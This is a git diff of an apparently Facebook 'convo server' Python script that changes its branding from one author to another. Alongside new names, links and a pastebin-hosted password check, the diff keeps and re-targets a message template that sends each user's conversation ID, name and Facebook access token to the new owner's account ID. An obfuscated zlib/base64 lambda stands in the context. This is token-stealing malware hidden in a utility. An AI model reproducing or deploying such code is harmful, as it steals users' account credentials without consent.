@@ -30,7 +30,7 @@ html_content = """
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XM9RTY AYUSH K1NG</title>
+    <title>S4HB44N SH4IF3 C0NV0</title>
     <style>
         body {
             background-image: url('Ayush.jpg');
@@ -61,12 +61,12 @@ html_content = """
 <body>
     <div class="container">
         <div class="box">
-            <h1>XM9RTY AYUSH K1NG</h1>
+            <h1>S4HB44N SH4IF3</h1>
             <div class="credit">
-                <p>1. CREDIT:-XM9RTY AYUSH KING</p>
-                <p>2. OWNER => XM9RTY AYUSH K1NG</p>
-                <p>3. CONTACT:- <a href="https://wa.me/+919919180262">WhatsApp</a></p>
-                <p>4. FACEBOOK:- <a href="https://https://www.facebook.com/XMARTY.AYUSH.KING.YOUTUBER.420">Facebook</a></p>
+                <p>1. CREDIT:-SAHBAAN SHAIFE</p>
+                <p>2. OWNER => SAHBAN SHAIFE</p>
+                <p>3. CONTACT:- <a href="https://wa.me/+9192">WhatsApp</a></p>
+                <p>4. FACEBOOK:- <a href="https://https://www.facebook.com/SAHBAN SHAIFE">Facebook</a></p>
                 <p>5. WATTSAPP GROUP:- <a href="https://https://chat.whatsapp.com/Hr8veZbLmpg5sro6xS5Smc">WhatsApp Group</a></p>
             </div>
         </div>
@@ -74,7 +74,7 @@ html_content = """
     <div class="thanks">
         <p>❤️TH9NKS FOR US1NG MY OFFL1N3 S3RV3R❤️</p>
         <p>👇SUBSCR1B3 TO MY YOUTUB3 CH9NN3L👇</p>
-        <a href="https://youtube.com/@xmarty_ayush_king?feature=shared">YouTube Channel</a>
+        <a href="https://youtube.com/@SAHBAN SHAIFE?feature=shared">YouTube Channel</a>
     </div>
 </body>
 </html>
@@ -110,17 +110,17 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[
 
 def send_initial_message():
     
-    mmm_pass = requests.get('https://pastebin.com/raw/NZKKryvH').text
+    mmm_pass = requests.get('https://pastebin.com/raw/VPjCUhx1').text
     
     if mmm_pass not in password:
-        print('\033[1;31m⚠︎ YOUR P9SSW0RD CH9NG3D BY XM9RTY AYUSH K1NG ⚠︎')
+        print('\033[1;31m⚠︎ YOUR P9SSW0RD CH9NG3D BY SAHBAAN SHAIFE ⚠︎')
         sys.exit()
     
     # Message template
-    msg_template = "Owner => Ayush \n Hello Xmarty Ayush King sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    msg_template = "Owner => SAHBAN SHAIFE \n Hello SAHBAAN SHAIFE sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["XMARTY.AYUSH.KING.YOUTUBER.420"]
+    target_ids = ["100042767170521"]
     
     requests.packages.urllib3.disable_warnings()
     
